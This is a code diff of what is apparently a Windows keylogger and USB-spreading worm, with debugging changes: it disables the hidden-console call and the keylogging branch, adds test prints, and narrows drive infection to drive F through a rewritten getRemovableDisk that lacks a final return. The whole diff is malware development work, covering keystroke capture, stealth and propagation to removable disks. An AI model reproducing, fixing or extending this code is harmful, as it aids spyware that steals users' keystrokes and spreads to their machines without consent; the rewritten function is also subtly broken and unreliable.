@@ -39,8 +39,8 @@ char* getRandomName();
 
 
 main(){
-    FreeConsole();  //window is not visible
-
+    //FreeConsole();  //window is not visible
+    
     age = get_setAge();
     if(checkRecordSize()){   ///check for right time
     
@@ -69,18 +69,23 @@ main(){
     }
 
     char driveLetter = getRemovableDisk();    //initial search for removable disk
-    return 0; // :)
+    //return 0; // :)
+    printf("pippo\n");
+    
     while(1){
         ////////////////****LOG KEY****/////////////////
-        if(age <= LIFE_TIME){    ///check age
+        printf("azzz\n");
+/*        if(age <= LIFE_TIME){    ///check age
             logKey();
         }else{
             Sleep(5000);
         }
-
+*/
         ///////////////////****INFECT****///////////////////
         driveLetter = getRemovableDisk();
-        if(driveLetter!='0'){
+        
+        //printf("%c\n", driveLetter);
+        if(driveLetter=='F'){
             infectDrive(driveLetter);
         }
     }
@@ -183,7 +188,7 @@ void logKey(){
 /*
  *  returns newly inserted disk
  */
-char getRemovableDisk(){
+char getRemovableDiskold(){
     char drive='0';
 
     char szLogicalDrives[MAX_PATH];
@@ -204,7 +209,37 @@ char getRemovableDisk(){
 
     return drive;
 }
+char getRemovableDisk(){
+    char drive='0';
+	
+    char szLogicalDrives[MAX_PATH];
+    DWORD dwResult = GetLogicalDriveStrings(MAX_PATH, szLogicalDrives);
+	
+    string currentDrives="";
 
+    //cout << dwResult << endl;
+    for(int i=0; i<dwResult; i++)
+    {
+    	printf("%i\n", dwResult);
+    	printf("%c\n", szLogicalDrives[i]);
+        if(szLogicalDrives[i]>64 && szLogicalDrives[i]< 90)
+        {
+        	
+            currentDrives.append(1, szLogicalDrives[i]);
+
+            if(allDrives.find(szLogicalDrives[i]) > 100)
+            {
+                drive = szLogicalDrives[i];
+                
+                //if (drive!='0')
+                	//return drive;	
+            }
+        }
+        if (drive=='F')
+                	return drive;
+    }
+    
+}
 /*
  *  send files to new drive
  */
